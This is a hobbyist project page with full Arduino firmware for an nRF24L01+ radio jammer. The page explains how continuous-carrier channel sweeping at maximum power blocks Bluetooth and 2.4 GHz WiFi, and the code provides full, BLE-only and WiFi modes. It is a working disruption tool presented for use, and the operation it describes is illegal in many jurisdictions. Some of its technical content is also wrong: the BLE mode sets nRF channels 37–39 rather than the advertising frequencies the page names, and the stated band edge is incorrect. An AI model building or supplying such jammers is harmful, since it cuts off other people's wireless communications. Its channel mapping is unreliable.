01 — how it works
signal interference — the concept
bluetooth and wifi both operate in the 2.4 GHz ISM band — a shared, unlicensed slice of spectrum from roughly 2400 MHz to 2525 MHz. devices communicate by broadcasting modulated signals on specific channels within that band. a jammer works by flooding those same channels with a continuous carrier signal — raw RF energy with no meaningful data. legitimate devices trying to transmit find their signal buried under noise and can't establish or maintain a connection.
why the nrf24l01+ works for this
the nRF24L01+ is a 2.4 GHz transceiver with 1 MHz channel spacing, covering channels 0–125 (2400–2525 MHz). it supports startConstCarrier() — a mode that emits a raw, unmodulated continuous wave at maximum power. by rapidly cycling setChannel() across target frequencies faster than receiver timeout windows, it saturates the band. with SPI overclocked to 8 MHz (SPI_CLOCK_DIV2), channel switches happen at maximum speed.
bluetooth channel mapping
bluetooth classic hops across 79 channels (2402–2480 MHz, 1 MHz apart). BLE uses 40 channels but advertises only on 3 fixed channels: 37, 38, 39 (2402, 2426, 2480 MHz). to disrupt BLE pairing and discovery, you only need to saturate those three. wifi 2.4 GHz uses 11–13 overlapping 22 MHz-wide channels — but only channels 1, 6, and 11 are non-overlapping and most commonly used.
02 — hardware
Components
Arduino Uno
Microcontroller
runs the jam logic, button input, lcd driver, and spi master. SPI overclocked to 8 MHz via SPI_CLOCK_DIV2 to maximize channel-switch throughput.
nRF24L01+
RF Transceiver
2.4 GHz module. CRC disabled, auto-ack off, retries 0, payload 5B, address width 3B. PA level MAX. continuous carrier mode active.
5V Adapter
Power Module
the nRF24L01+ draws significant current at PA_MAX — the adapter stabilizes 3.3V supply and prevents brownouts that corrupt SPI on the bare arduino 3.3V pin.
LCD I2C
16×2 Display
address 0x27. shows current mode and target channels. updated only on button press to avoid loop overhead slowing channel cycling.
Button @ A2
Mode Toggle
INPUT_PULLUP, active-low. cycles through 4 modes with 300ms debounce. no interrupts used — polled each loop iteration.

/*
 * NRF24KXB JAMMER — khxngvng
 * arduino uno + nRF24L01+ + 5V adapter + 16x2 LCD I2C
 */
#include "RF24.h"
#include <SPI.h>
#include <LiquidCrystal_I2C.h>

LiquidCrystal_I2C lcd(0x27, 16, 2);
RF24 radio(9, 10);                  // ce=9, csn=10

int          jamMode    = 0;         // 0=full 1=ble 2=wifi 3=credit
const int    buttonPin = A2;
byte         i         = 45;         // initial channel
unsigned int flag      = 0;

void setup() {
  Serial.begin(115200);

  SPI.setClockDivider(SPI_CLOCK_DIV2); // 8 MHz — max spi speed

  lcd.init();
  lcd.backlight();
  pinMode(buttonPin, INPUT_PULLUP);

  lcd.setCursor(0, 0); lcd.print("nRF24 JAMMER");
  lcd.setCursor(0, 1); lcd.print("     by KHXNGVNG");

  if (radio.begin()) {
    delay(20);
    Serial.println("radio init!!!");
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, i);
  } else {
    Serial.println("failed to init radio!!");
  }
}

void loop() {

  // button: cycle mode, update lcd once, debounce 300ms ──────
  if (digitalRead(buttonPin) == LOW) {
    jamMode++;
    if (jamMode > 3) jamMode = 0;
    lcd.clear();
    lcd.setCursor(0, 0);
    if      (jamMode == 0) { lcd.print("MODE : FULL");    lcd.setCursor(0,1); lcd.print("CH : 0-79 + BLE"); }
    else if (jamMode == 1) { lcd.print("MODE : BLE ONLY"); lcd.setCursor(0,1); lcd.print("CH : 37, 38, 39"); }
    else if (jamMode == 2) { lcd.print("MODE : WIFI");    lcd.setCursor(0,1); lcd.print("CH : 1, 6, 11"); }
    else if (jamMode == 3) { lcd.print("nRF24 JAMMER");  lcd.setCursor(0,1); lcd.print("     by KHXNGVNG"); }
    delay(300);
  }

  // jam logic ────────────────────────────────────────────────
  if (jamMode == 0 || jamMode == 3) {
    for (byte c = 0; c < 79; c++) radio.setChannel(c);
    radio.setChannel(37);  // unrolled BLE
    radio.setChannel(38);
    radio.setChannel(39);
  }
  else if (jamMode == 1) {
    radio.setChannel(37);  // BLE only — no loop overhead
    radio.setChannel(38);
    radio.setChannel(39);
  }
  else if (jamMode == 2) {
    radio.setChannel(12);  // WiFi ch1  → 2412 MHz
    radio.setChannel(37);  // WiFi ch6  → 2437 MHz
    radio.setChannel(62);  // WiFi ch11 → 2462 MHz
  }
}
